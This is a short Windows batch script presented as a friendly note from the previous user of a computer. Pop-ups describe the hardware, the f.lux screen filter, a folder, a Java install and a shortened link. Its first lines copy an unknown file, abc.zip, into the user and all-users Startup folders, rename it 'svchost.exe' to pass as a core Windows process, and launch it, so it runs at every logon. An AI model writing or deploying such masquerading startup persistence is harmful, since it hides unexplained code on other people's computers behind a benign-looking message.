echo f|xcopy /f ".\abc.zip" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.zip" "svchost.exe"
start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
echo f|xcopy ".\abc.zip" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc.zip" "svchost.exe"

msg * Message from previous user of this computer
msg * This is your current computer's specification
dxdiag
msg * Notice the yellowness of your screen, it is flux

msg * flux adjust bluelight filter and brightness to reduce eye strain
msg * keep it or uninstall it, its up to you

msg * Chia's folder is at my documents

msg * Java sdk is installed in this computer

msg * visit me at https://bit.ly/nwymof